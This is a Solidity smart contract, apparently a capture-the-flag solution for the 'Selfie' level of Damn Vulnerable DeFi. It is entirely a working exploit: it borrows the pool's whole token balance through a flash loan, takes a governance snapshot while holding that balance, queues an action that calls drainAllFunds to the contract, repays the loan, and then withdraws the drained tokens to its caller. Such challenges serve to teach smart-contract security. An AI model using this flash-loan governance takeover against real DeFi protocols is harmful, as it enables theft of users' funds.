// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    address immutable pool;
    address immutable governance;
    address immutable token;

    constructor(
        address _pool,
        address _governance,
        address _token
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
    }

    function start(uint256 amount) public {
        uint256 _amt = amount;
        if (_amt == 0) {
            _amt = DamnValuableTokenSnapshot(token).balanceOf(pool);
        }
        SelfiePool(pool).flashLoan(_amt);
    }

    function withdraw() public {
        uint256 _amt = DamnValuableTokenSnapshot(token).balanceOf(
            address(this)
        );
        DamnValuableTokenSnapshot(token).transfer(msg.sender, _amt);
    }

    function receiveTokens(address _token, uint256 amount)
        external
    {
        DamnValuableTokenSnapshot(token).snapshot();
        bytes memory data = abi.encodeWithSelector(
            SelfiePool.drainAllFunds.selector,
            address(this)
        );
        SimpleGovernance(governance).queueAction(
            pool,
            data,
            0
        );
        DamnValuableTokenSnapshot(token).transfer(pool, amount);
    }

    receive() external payable {}
}
